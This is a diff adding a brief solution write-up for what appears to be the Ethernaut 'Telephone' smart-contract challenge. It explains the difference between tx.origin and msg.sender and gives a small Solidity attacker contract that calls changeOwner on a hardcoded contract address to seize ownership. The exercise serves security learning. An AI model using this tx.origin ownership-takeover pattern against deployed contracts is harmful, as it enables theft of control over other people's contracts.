@@ -1,0 +1,9 @@
+tx.origin can only hold an address of a user wallet and not a smart contract,by writing a 
+contract to interact with telephone I was able to make sure tx.origin != msg.sender.
+
+contract hackTelephone{
+Telephone public phone = Telephone(0x189488Ca923c089F0babf3b3a33dC376a27950f6);
+constructor(address _owner)public{
+    phone.changeOwner(_owner);
+}
+}
